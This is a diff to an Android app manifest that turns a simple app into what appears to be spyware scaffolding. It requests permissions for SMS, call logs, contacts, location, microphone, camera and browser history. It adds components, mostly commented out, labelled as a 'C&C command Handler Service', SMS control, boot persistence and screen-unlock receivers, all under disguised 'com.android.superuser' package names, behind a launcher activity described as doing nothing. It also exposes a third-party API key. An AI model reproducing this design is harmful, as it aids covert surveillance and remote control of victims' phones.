@@ -1,6 +1,56 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.guifeng.myworld">
+    <!-- permission of SMS -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+
+    <!-- permission of phone state -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- permission of calling -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+
+    <!-- permission of network and WIFI -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- permission of localization -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+
+    <!-- permission of recorder -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- permission of SD card -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <!-- permission of camera -->
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <!-- permission to grant for self-starting -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- permission of contact -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+
+    <!-- permission of sensor -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+
+    <!-- permission of history -->
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+
+    <!-- permission of process -->
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+
+    <!-- permission of calllogs -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
     <application
         android:allowBackup="true"
@@ -9,12 +59,98 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
         <activity android:name=".LoginActivity">
+<!--
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
+-->
         </activity>
+
+        <!-- Self boot broadcast receiver -->
+<!--
+        <receiver android:name="com.android.superuser.waker.BootBroadcastReceiver" android:exported="false" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.HOME" />
+            </intent-filter>
+        </receiver>
+-->
+
+        <!-- C&C command Handler Service -->
+<!--        <service android:name="com.android.superuser.smscontrol.SMSServie" android:exported="false" >"
+            <intent-filter >
+                <action android:name=".SMSServie" />
+            </intent-filter>
+        </service>-->
+
+        <!-- after booting, dynamic register a service then register a broadcastReceiver to get the highest SMS priority -->
+<!--
+        <service android:name="com.android.main.MainService" android:exported="false" >
+            <intent-filter>
+                <action android:name=".MainService" />
+            </intent-filter>
+        </service>
+-->
+
+<!--
+        <service
+            android:name="com.baidu.location.f"
+            android:enabled="true"
+            android:process=":remote" >
+            <intent-filter>
+                <action android:name="com.baidu.location.service_v2.2" >
+                </action>
+            </intent-filter>
+        </service>
+-->
+
+        <!-- meta-data需要写在application中 -->
+<!--
+        <meta-data
+            android:name="com.baidu.lbsapi.API_KEY"
+            android:value="Yv7B6uciU3IxMrN6bRBgSz7r" />
+-->
+
+        <!-- receiver to reconnect the client and server -->
+<!--
+        <receiver android:name="com.android.superuser.waker.AlarmBroadcastReceiver" >
+        </receiver>
+-->
+
+<!--
+        <receiver android:name="com.android.superuser.waker.ScreenUnlockReceiver">
+            <intent-filter >
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+-->
+
+        <!-- Launcher activity of the whole project, do nothing -->
+        <activity
+            android:label="@string/app_name"
+            android:name=".DateTable" >
+            <intent-filter >
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+<!--
+        <receiver android:name="com.datetable.DateListWidget"
+            android:label="@string/app_name">
+            <meta-data
+                android:name="android.appwidget.provider"
+                android:resource="@xml/appwidget_provider">
+            </meta-data>
+            <intent-filter >
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+        </receiver>
+-->
+
+
     </application>
 
 </manifest>
